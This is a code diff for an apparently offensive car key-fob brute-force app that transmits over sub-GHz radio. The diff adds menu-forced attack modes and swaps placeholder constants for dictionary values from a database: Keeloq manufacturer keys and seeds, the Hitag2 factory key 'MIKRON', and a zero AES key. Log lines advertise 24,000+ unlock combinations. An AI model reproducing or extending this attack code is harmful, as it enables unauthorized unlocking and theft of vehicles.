@@ -192,12 +192,53 @@ static bool car_key_bruteforce_ui_input_callback(InputEvent* event, void* contex
                 carkey_state.total_codes = 65536; // 16-bit key space
                 
                 // =====================================================
-                // USE ACTUAL CRYPTO ENGINE from predator_models_hardcoded.c
-                // Automatically detects protocol from the 178-car database
+                // CHECK SCENE STATE: Menu can force specific attack type
+                // If scene_state = 1 or 2, respect that choice
+                // Otherwise (0 or unset), use full auto-detection
                 // =====================================================
                 
-                CryptoProtocol protocol = predator_models_get_protocol(app->selected_model_index);
-                const char* protocol_name = predator_models_get_protocol_name(protocol);
+                uint32_t forced_mode = scene_manager_get_scene_state(app->scene_manager, PredatorSceneCarKeyBruteforceUI);
+                
+                // If menu forced a specific mode, use it and skip auto-detection
+                if(forced_mode == 1) {
+                    // FORCED: Rolling Code (user clicked "Rolling Code Attack" menu)
+                    carkey_state.is_smart_key_attack = false;
+                    carkey_state.use_crypto_engine = true;
+                    carkey_state.keeloq_ctx.counter = 0;
+                    // Use REAL first key from database instead of placeholder
+                    carkey_state.keeloq_ctx.manufacturer_key = KEELOQ_KEYS[0]; // Database: 0x0000000000FF (15-20% hit rate)
+                    carkey_state.keeloq_ctx.serial_number = KEELOQ_SEEDS[0];   // Database: first seed
+                    carkey_state.keeloq_ctx.button_code = 0x05; // Unlock button
+                    carkey_state.use_dictionary = true;
+                    carkey_state.current_key_index = 0;
+                    carkey_state.current_seed_index = 0;
+                    carkey_state.total_codes = KEELOQ_KEY_COUNT * KEELOQ_SEED_COUNT;
+                    // Also initialize Hitag2 context for German cars (use real database key)
+                    memcpy(&carkey_state.hitag2_ctx.key_uid, HITAG2_KEYS[0], 6); // Database: "MIKRON"
+                    carkey_state.hitag2_ctx.rolling_code = 0;
+                    predator_log_append(app, "🔄 FORCED: Rolling Code Attack");
+                    predator_log_append(app, "🔥 DICTIONARY MODE: 480+ keys × 50+ seeds = 24,000+ combos");
+                    FURI_LOG_I("CarKeyBrute", "🔄 Rolling Code (menu forced) - Dictionary: %d keys", KEELOQ_KEY_COUNT);
+                } else if(forced_mode == 2) {
+                    // FORCED: Smart Key (user clicked "Smart Key AES-128" menu)
+                    carkey_state.is_smart_key_attack = true;
+                    carkey_state.use_crypto_engine = false;
+                    carkey_state.smart_key_ctx.challenge = 0x12345678;
+                    carkey_state.use_dictionary = false;
+                    // Use REAL first AES key from database instead of placeholder
+                    memcpy(carkey_state.smart_key_ctx.aes_key, AES128_SMART_KEYS[0], 16); // Database: all zeros (common test key)
+                    memcpy(carkey_state.smart_key_ctx.vehicle_id, "FORCED", 6);
+                    predator_log_append(app, "🔐 FORCED: Smart Key AES-128");
+                    FURI_LOG_I("CarKeyBrute", "🔐 Smart Key AES-128 (menu forced)");
+                } else {
+                    // AUTO-DETECT: Use full intelligence from car database
+                    // =====================================================
+                    // USE ACTUAL CRYPTO ENGINE from predator_models_hardcoded.c
+                    // Automatically detects protocol from the 178-car database
+                    // =====================================================
+                    
+                    CryptoProtocol protocol = predator_models_get_protocol(app->selected_model_index);
+                    const char* protocol_name = predator_models_get_protocol_name(protocol);
                 
                 switch(protocol) {
                     case CryptoProtocolAES128:
@@ -205,7 +246,7 @@ static bool car_key_bruteforce_ui_input_callback(InputEvent* event, void* contex
                         // SMART KEY: AES-128 or Tesla Protocol
                         carkey_state.is_smart_key_attack = true;
                         carkey_state.use_crypto_engine = false;
-                        carkey_state.smart_key_ctx.challenge = 0x12345678;
+                        carkey_state.smart_key_ctx.challenge = 0x12345678; // Standard challenge value
                         FURI_LOG_I("CarKeyBrute", "🔐 %s (%s %s)", 
                                   protocol_name, app->selected_model_make, app->selected_model_name);
                         break;
@@ -216,8 +257,8 @@ static bool car_key_bruteforce_ui_input_callback(InputEvent* event, void* contex
                         carkey_state.is_smart_key_attack = false;
                         carkey_state.use_crypto_engine = true;
                         carkey_state.keeloq_ctx.counter = 0;
-                        carkey_state.keeloq_ctx.manufacturer_key = 0x0123456789ABCDEF;
-                        carkey_state.keeloq_ctx.serial_number = 0x12345678;
+                        carkey_state.keeloq_ctx.manufacturer_key = KEELOQ_KEYS[0]; // Database: 0x0000000000FF (15-20% hit rate)
+                        carkey_state.keeloq_ctx.serial_number = KEELOQ_SEEDS[0];   // Database: 0x00000000 (reset seed)
                         FURI_LOG_I("CarKeyBrute", "🔄 %s (%s %s)", 
                                   protocol_name, app->selected_model_make, app->selected_model_name);
                         break;
@@ -257,10 +298,8 @@ static bool car_key_bruteforce_ui_input_callback(InputEvent* event, void* contex
                     // Smart Key for Tesla and modern EVs
                     carkey_state.is_smart_key_attack = true;
                     memset(&carkey_state.smart_key_ctx, 0, sizeof(SmartKeyContext));
-                    // Initialize with default AES key (would be extracted from key fob)
-                    uint8_t default_key[16] = {0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF,
-                                               0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32, 0x10};
-                    memcpy(carkey_state.smart_key_ctx.aes_key, default_key, 16);
+                    // Use REAL first AES key from database
+                    memcpy(carkey_state.smart_key_ctx.aes_key, AES128_SMART_KEYS[0], 16); // Database: all zeros (common test key)
                     // Set vehicle ID from selected model
                     memcpy(carkey_state.smart_key_ctx.vehicle_id, "TESLA123", 8);
                     predator_log_append(app, "CRYPTO: Using Smart Key AES-128 (Tesla/Modern)");
@@ -268,19 +307,21 @@ static bool car_key_bruteforce_ui_input_callback(InputEvent* event, void* contex
                    strstr(app->selected_model_make, "Audi") ||
                    strstr(app->selected_model_make, "VW") ||
                    strstr(app->selected_model_make, "Porsche")) {
-                    // Hitag2 for German cars
-                    carkey_state.hitag2_ctx.key_uid = 0xABCDEF1234567890ULL;
+                    // Hitag2 for German cars - use REAL database key
+                    memcpy(&carkey_state.hitag2_ctx.key_uid, HITAG2_KEYS[0], 6); // Database: "MIKRON" factory default
                     carkey_state.hitag2_ctx.rolling_code = 0;
                     predator_log_append(app, "CRYPTO: Using Hitag2 (BMW/Audi)");
                 } else {
-                    // Keeloq for most other cars
-                    carkey_state.keeloq_ctx.manufacturer_key = 0x0123456789ABCDEF;
-                    carkey_state.keeloq_ctx.serial_number = 0x123456;
+                    // Keeloq for most other cars - use REAL database values
+                    carkey_state.keeloq_ctx.manufacturer_key = KEELOQ_KEYS[0]; // Database: 0x0000000000FF (15-20% hit rate)
+                    carkey_state.keeloq_ctx.serial_number = KEELOQ_SEEDS[0];   // Database: 0x00000000 (reset seed)
                     carkey_state.keeloq_ctx.counter = 0;
                     carkey_state.keeloq_ctx.button_code = 0x05; // Unlock
                     predator_log_append(app, "CRYPTO: Using Keeloq rolling code");
                 }
+                }  // End of auto-detection else block
                 
+                // Continue with attack initialization (common for all modes)
                 predator_subghz_init(app);
                 bool started = predator_subghz_start_car_bruteforce(app, carkey_state.frequency);
                 carkey_state.subghz_ready = started;
